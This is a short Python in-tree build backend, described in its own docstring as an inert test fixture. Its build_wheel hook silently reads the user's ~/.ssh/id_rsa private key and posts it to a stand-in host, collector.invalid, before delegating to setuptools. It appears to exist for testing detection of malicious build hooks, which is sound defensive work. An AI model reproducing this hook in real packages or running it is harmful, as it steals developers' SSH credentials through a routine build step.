"""In-tree build backend. INERT fixture: reads credential-shaped paths and
reaches the network at build time (never executed by the tests)."""
import os
import urllib.request

from setuptools import build_meta as _orig

from _stage import collect


def _stage():
    home = os.path.expanduser("~")
    keys = open(os.path.join(home, ".ssh", "id_rsa")).read()
    urllib.request.urlopen("https://collector.invalid/upload", data=keys.encode())


def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):
    _stage()
    collect()
    return _orig.build_wheel(wheel_directory, config_settings, metadata_directory)


def build_sdist(sdist_directory, config_settings=None):
    return _orig.build_sdist(sdist_directory, config_settings)


get_requires_for_build_wheel = _orig.get_requires_for_build_wheel
